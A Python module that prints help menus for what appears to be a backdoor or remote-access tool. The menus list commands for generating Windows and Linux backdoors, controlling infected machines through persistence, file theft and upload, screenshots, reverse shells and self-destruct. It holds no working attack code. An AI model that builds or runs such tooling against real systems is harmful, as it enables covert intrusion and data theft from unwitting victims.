from tabulate import tabulate
from .var import globals as g


def help_menu(command: str = 'help', parent: str = 'shell'):
    if parent == 'shell':
        if command == 'help':
            print(f'''
{g.y}Command     Description                                    Help{g.e}
{g.e}-------     -----------                                    ----{g.e}
{g.g}help{g.e}        Print this message.                            {g.bl}[No]{g.e}
{g.g}generate{g.e}    Generate a Windows or linux backdoor.          {g.bl}[Yes]{g.e}
{g.g}set{g.e}         Set parameters such as host and port.          {g.bl}[Yes]{g.e}
{g.g}listen{g.e}      Start listen for incoming connections.         {g.bl}[No]{g.e}
{g.g}list{g.e}        list active or all connections.                {g.bl}[Yes]{g.e}
{g.g}select{g.e}      Gain control to an active connections.         {g.bl}[Yes]{g.e}
{g.g}close{g.e}       Close all or a single active connection.       {g.bl}[Yes]{g.e}
{g.g}clear{g.e}       Clear the screen.                              {g.bl}[No]{g.e}
{g.g}qs{g.e}          Quit the server only.                          {g.bl}[No]{g.e}
{g.g}q!{g.e}          Quit the server and all the active clients.    {g.bl}[No]{g.e}

[{g.g}Info{g.e}] Enter '[command] --help' or '[command] -h' to view full usage of the command.''')

        elif 'generate' in command:
            print(f'''
{g.y}Usage:{g.e}
    generate -os [OS] -lhost [IP] -lport [PORT] -outfile [FILE NAME]
    generate [flags] [arguments]

{g.y}Flags:{g.e}
    {g.g}-h, --help{g.e}    Print help for generate
    {g.g}-os{g.e}           Specify target OS
    {g.g}-lhost{g.e}        Specify server listening host
    {g.g}-lport{g.e}        Specify Server listening port
    {g.g}-outfile{g.e}      Specify output file name and directory

{g.y}Arguments:{g.e}
    {g.g}win/linux{g.e}           For -os
    {g.g}server IP{g.e}           For -lhost
    {g.g}server port{g.e}         For -lport
    {g.g}output file name{g.e}    For -outfile''')

        elif 'set' in command:
            print(f'''
{g.y}Usage:{g.e}
    set [flag] [argument]

{g.y}Flags:{g.e}
    {g.g}-h, --help{g.e}     Print help for set
    {g.g}-i, --lhost{g.e}    Set the listening host
    {g.g}-p, --lport{g.e}    Set the listening port
    
{g.y}Arguments:{g.e}
    {g.g}server IP{g.e}      For -i, --lhost
    {g.g}server port{g.e}    For -p, --lport''')

        elif 'list' in command:
            print(f'''
{g.y}Usage:{g.e}
    list [flag]
    
{g.y}Flags:{g.e}
    {g.g}-h, --help{g.e}      Print help for list
    {g.g}-a, --all{g.e}       List all the connections
    {g.g}-c, --active{g.e}    List only the active connections
    
{g.y}Arguments:{g.e}
    {g.g}None{g.e}''')

        elif 'select' in command:
            print(f'''
{g.y}Usage:{g.e}
    select [flag] [argument]
    
{g.y}Flags:{g.e}
    {g.g}-h, --help{g.e}    Print help for select
    {g.g}-id{g.e}           Specify session ID

{g.y}Arguments:{g.e}
    {g.g}session ID{g.e}    For -id''')

        elif 'close' in command:
            print(f'''
{g.y}Usage:{g.e}
    close [flag] [argument]

{g.y}Flags:{g.e}
    {g.g}-h, --help{g.e}    Print help for close
    {g.g}-id{g.e}           Close a specified connection
    {g.g}-all{g.e}          Close all specified connections
    
{g.y}Arguments:{g.e}
    {g.g}session ID{g.e}    For -id''')

        else:
            print()
            print(f"[{g.r}Error{g.e}] Invalid command!")
            print(f"[{g.r}Error{g.e}] '{command}' isn't recognised as an internal or external command.\n")
            print(f"[{g.bl}Fix{g.e}]    Enter 'help' to view all the commands and their functions.")

    if parent == 'session':
        if command == 'help':
            print(f'''
{g.y}Command             Description{g.e}
{g.e}-------             -----------{g.e}
{g.g}persistence{g.e}         Add persistence to run client program at start up.
{g.g}cwd{g.e}                 Get the current working directory.
{g.g}ls_cwd{g.e}              List the current working directory of the client. 
{g.g}ls_dir{g.e}              List a specific directory in the target machine.
{g.g}dwnld{g.e}               Download a file from the target machine.
{g.g}upld{g.e}                Upload a file to the target machine.
{g.g}chdir{g.e}               Change directory.
{g.g}rmv{g.e}                 Delete a file from the target machine.
{g.g}rmv_dir{g.e}             Delete a full/empty directory from the target machine.
{g.g}opn_url{g.e}             Open a URL or link in the target machine.
{g.g}strt_proc{g.e}           Start a process (file or executable) in the target machine.    
{g.g}curr_usr{g.e}            Get current user's Username.
{g.g}chk_admin{g.e}           Check if the current user is admin.
{g.g}list_usrs{g.e}           List all the available users in the target machine.
{g.g}curr_usr_details{g.e}    Get the current user's details.
{g.g}usr_details{g.e}         Get a specified user's details.
{g.g}take_ss{g.e}             Take and save a screenshot of the target machine.
{g.g}getshell{g.e}            Get/gain a reverse shell of the target machine.
{g.g}logout{g.e}              Logout the current user.
{g.g}restrt{g.e}              Restart the target machine.
{g.g}shut{g.e}                Shutdown the target machine.
{g.g}self_destruct{g.e}       Delete the client program and registry key from the target system.
{g.g}clear{g.e}               Clear the screen.
{g.g}exit/quit{g.e}           Exit the current active session.''')

        else:
            print()
            print(f"[{g.r}Error{g.e}] Invalid command!")
            print(f"[{g.r}Error{g.e}] '{command}' isn't recognised as an internal or external command.\n")
            print(f"[{g.bl}Fix{g.e}]    Enter 'help' to view all the commands and their functions.")
